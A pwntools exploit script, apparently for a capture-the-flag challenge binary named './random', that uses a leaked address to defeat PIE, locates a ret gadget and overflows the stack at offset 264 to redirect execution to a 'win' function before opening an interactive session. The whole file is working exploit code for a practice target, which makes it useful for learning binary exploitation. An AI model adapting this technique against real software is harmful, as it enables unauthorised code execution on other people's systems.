from pwn import *

def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kwargs)
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)

gdbscript='''
continue
'''

exe='./random'
elf=context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'


ret_addr_offset = 256 + 8
print(f'The offset of return address is {ret_addr_offset}')

io=start()
io.recvuntil(b'I can give you a secret')
vuln_addr = int(io.recvline().strip(),16)

offset = int('0x1319',16) - int('0x1210',16)
print(f'the offset between vuln and win is {offset} in decimial')

binary_base = vuln_addr - int('0x1319',16)
print(f'The base address of is {binary_base:x}')

rop=ROP(elf)
ret_gadget = binary_base + rop.find_gadget(['ret'])[0]
print(f'The return gadget is {ret_gadget}')

win_address = vuln_addr - offset
print(f'The win_address is {hex(win_address)}')

payload = flat({ret_addr_offset:[ret_gadget, win_address]})

io.sendlineafter(b'Where are we going? :', payload)

io.interactive()


